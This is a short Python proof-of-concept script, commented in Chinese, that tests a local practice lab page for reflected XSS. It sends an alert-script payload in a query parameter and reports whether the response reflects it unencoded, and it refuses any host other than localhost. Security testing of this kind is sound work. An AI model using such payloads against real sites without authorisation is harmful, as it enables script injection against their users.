#!/usr/bin/env python3
"""XSS-001 本地授权靶场反射型 XSS 最小验证草案（未运行）。
仅允许 localhost/127.0.0.1/::1，不跟随重定向，不使用真实口令。
用法示例：python xss001_poc.py --base-url http://127.0.0.1 --path /vulnerabilities/xss_r/
"""
import argparse
import http.client
import sys
from urllib.parse import urlencode, urlsplit

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}
PAYLOAD = "<script>alert('XSS001')</script>"


def main():
    parser = argparse.ArgumentParser(description="XSS-001 反射型 XSS 验证草案")
    parser.add_argument("--base-url", default="http://127.0.0.1", help="靶场基址，仅允许本地主机")
    parser.add_argument("--path", required=True, help="本片段所在页面的路径，需人工确认")
    parser.add_argument("--timeout", type=float, default=5.0, help="请求超时秒数")
    parser.add_argument("--cookie", default=None, help="可选会话 Cookie，不入库、不打印")
    args = parser.parse_args()

    parts = urlsplit(args.base_url)
    if parts.scheme not in ("http", "https") or parts.hostname not in ALLOWED_HOSTS:
        print("[FAIL] 仅允许 http(s) 且主机为 localhost/127.0.0.1/::1", file=sys.stderr)
        return 2

    target = args.path + "?" + urlencode({"name": PAYLOAD})
    headers = {"Accept": "text/html"}
    if args.cookie:
        headers["Cookie"] = args.cookie

    conn_cls = http.client.HTTPSConnection if parts.scheme == "https" else http.client.HTTPConnection
    conn = conn_cls(parts.hostname, parts.port, timeout=args.timeout)
    try:
        conn.request("GET", target, headers=headers)
        resp = conn.getresponse()
        body = resp.read().decode("utf-8", "replace")
    except OSError as exc:
        print(f"[ERROR] 连接失败或超时: {exc}", file=sys.stderr)
        return 3
    finally:
        conn.close()

    print(f"[INFO] HTTP {resp.status}，响应长度 {len(body)}")
    if resp.status in (301, 302, 303, 307, 308):
        print("[WARN] 收到重定向，脚本未跟随；请人工确认登录状态与目标路径", file=sys.stderr)
        return 4
    if PAYLOAD in body:
        print("[OBSERVE] 原始 payload 未经编码出现在响应中")
        print("[NEXT] 需在浏览器中打开同一 URL，确认 alert('XSS001') 标记弹出")
        return 0
    if "&lt;script&gt;" in body or "&#60;script&#62;" in body:
        print("[OBSERVE] payload 以 HTML 实体形式出现，静态上未见可利用反射")
        return 0
    print("[OBSERVE] 响应中未定位 payload，需人工核对路径、参数名与登录状态")
    return 0


if __name__ == "__main__":
    sys.exit(main())
